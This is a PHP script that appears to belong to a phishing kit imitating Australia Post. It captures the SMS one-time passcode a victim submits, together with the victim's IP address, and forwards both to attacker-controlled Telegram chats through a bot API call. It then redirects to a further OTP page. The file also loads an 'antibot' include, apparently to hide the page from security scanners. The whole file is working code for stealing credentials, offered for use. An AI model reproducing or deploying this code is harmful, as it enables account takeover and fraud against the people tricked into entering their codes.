<?php
require "antibot.php";
include "id.php";

$ip = getenv("REMOTE_ADDR");
$message = "😇 🪽 =|=[ 𝗔𝗡𝗚𝗘𝗟𝗜𝗖 𝗢𝗧𝗣 𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 ]=| 🪽 😇
━━━━━━━━━━━━━━━━━━━━━━━━
📨 𝗙𝗶𝗿𝘀𝘁 𝗦𝗠𝗦 𝗖𝗼𝗱𝗲 : ".$_POST['otp_code']."
☁️ 𝗨𝘀𝗲𝗿 𝗜𝗣        : ".$ip."
━━━━━━━━━━━━━━━━━━━━━━━━
🕊️ 𝗔𝗨𝗦𝗣𝗢𝗦𝗧 𝗫𝗧𝗡 • 𝗛𝗮𝗿𝗺𝗼𝗻𝘆 𝗟𝗼𝗴 😇
━━━━━━━━━━━━━━━━━━━━━━━━\n";
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot' . $bot . '/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}

HEADER("Location: otp.php");

?>